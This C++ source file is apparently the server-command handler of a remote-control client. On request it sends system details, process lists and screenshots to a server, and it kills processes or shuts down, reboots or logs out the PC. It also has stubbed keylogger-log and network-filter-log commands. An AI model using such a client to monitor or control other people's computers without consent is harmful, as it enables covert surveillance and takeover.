#include "ClientNetwork.hpp"
#include "ClientHandler.hpp"

#include "Json.hpp"
#include "ModulesManager.hpp"


namespace Distance::Network::Handler
{

    void Connect(
        std::shared_ptr<Client> client,
        Message& msg,
        [[maybe_unused]] const boost::system::error_code& ec
    )
    {
        /*
        if (ec)
        {
            LOG_INFO("The client failed to connect to the server! Error message: ", ec.message())
            return;
        }
        */
        client->asyncReceive(msg, Receive);
    }



    void Receive(
        std::shared_ptr<Client> client,
        Message& msg,
        const boost::system::error_code& ec,
        [[maybe_unused]] size_t size
    )
    {
        if (ec)
        {
            LOG_INFO("The client failed to receive message from the server! Error message: ", ec.message())
            return;
        }

        try
        {
            switch (msg.getMsgType())
            {

            //
            // PcInfo
            //
            case ServerMsgType::GetPcInfo:
            {
                Distance::Network::Json::PcInfo info;
                auto pcInfo = std::static_pointer_cast<Module::PcInfo>(
                    ModulesManager::invoke().getAccess(ModuleType::PcInfo)
                );

                // Fill PcInfo
                info.ip = pcInfo->localIp();
                info.localName = pcInfo->localName();

                auto cpuInfo = pcInfo->cpu();
                info.cpu.architecture = cpuInfo.architecture;
                info.cpu.name = cpuInfo.name;

                auto ramInfo = pcInfo->ram();
                memcpy(&info.ram, &ramInfo, sizeof(ramInfo));


                msg.setMsgType(ClientMsgType::PcInfo);
                msg << Distance::Network::Json::pack(info);
                
                if (!client->sendAll(msg))
                {
					LOG_INFO("The client failed to send message \'ClientMsgType::PcInfo\' to the server!")
					return;
                }

                msg.resize(0); // Clear message
                break;
            }



            //
            // ProcessManager
            //
            case ServerMsgType::GetProcessList:
            {
                auto processManager = std::static_pointer_cast<Module::ProcessManager>(
                    ModulesManager::invoke().getAccess(ModuleType::ProcessManager)
                );


                msg.setMsgType(ClientMsgType::ProcessList);
                msg << Distance::Network::Json::pack(processManager->processList());
                
                if (!client->sendAll(msg))
                {
					LOG_INFO("The client failed to send message \'ClientMsgType::ProcessList\' to the server!")
					return;
                }
				
                msg.resize(0); // Clear message
                break;
            }
			case ServerMsgType::TerminateProcess:
			{
				DWORD pid = 0;
				auto processManager = std::static_pointer_cast<Module::ProcessManager>(
					ModulesManager::invoke().getAccess(ModuleType::ProcessManager)
				);

				msg.resize(msg.size());
				msg.setMsgType(ServerMsgType::TerminateProcess);

				if (!client->receive(msg))
				{
					LOG_INFO("The client failed to receive message \'ServerMsgType::TerminateProcess\' from the server!")
					return;
				}

				msg >> pid;
				processManager->terminate(pid);

				msg.resize(0); // Clear message
				break;
			}



            //
            // Screenshot
            //
            case ServerMsgType::GetScreenshot:
            {
				auto screenshot = std::static_pointer_cast<Module::Screenshot>(
					ModulesManager::invoke().getAccess(ModuleType::Screenshot)
				);

				msg.setMsgType(ClientMsgType::Screenshot);
                msg << screenshot->createFullScreenshot();

				if (!client->sendAll(msg))
				{
					LOG_INFO("The client failed to send message \'ServerMsgType::GetScreenshot\' to the server!")
					return;
				}

				msg.resize(0); // Clear message
                break;
            }



            //
            // PowerManager
            //
            case ServerMsgType::ShutdownPC:
            {
				auto powerManager = std::static_pointer_cast<Module::PowerManager>(
					ModulesManager::invoke().getAccess(ModuleType::PowerManager)
				);

                if (powerManager->shutdown())
                {
					return;
                }
                
                break;
            }
            case ServerMsgType::RebootPC:
            {
				auto powerManager = std::static_pointer_cast<Module::PowerManager>(
					ModulesManager::invoke().getAccess(ModuleType::PowerManager)
				);

                if (powerManager->reboot())
                {
                    return;
                }

                break;
            }
			case ServerMsgType::LogoutPC:
			{
				auto powerManager = std::static_pointer_cast<Module::PowerManager>(
					ModulesManager::invoke().getAccess(ModuleType::PowerManager)
				);

                if (powerManager->logout())
                {
                    return;
                }

                break;
			}



            //
            // Keylogger
            //
            case ServerMsgType::GetKeyloggerLog:
            {
                msg.setMsgType(ClientMsgType::KeyloggerLog);
                break;
            }



            //
            // Netfilter
            //
            case ServerMsgType::GetNetfilterLog:
            {
                msg.setMsgType(ClientMsgType::NetfilterLog);
                break;
            }



            default:
                LOG_INFO("The client received unknown message from the server!")
            }
        }
		catch (const std::exception& ex)
		{
			LOG_INFO(ex.what());
		}

        client->asyncReceive(msg, Receive);
    }

} // Distance::Network::Handler
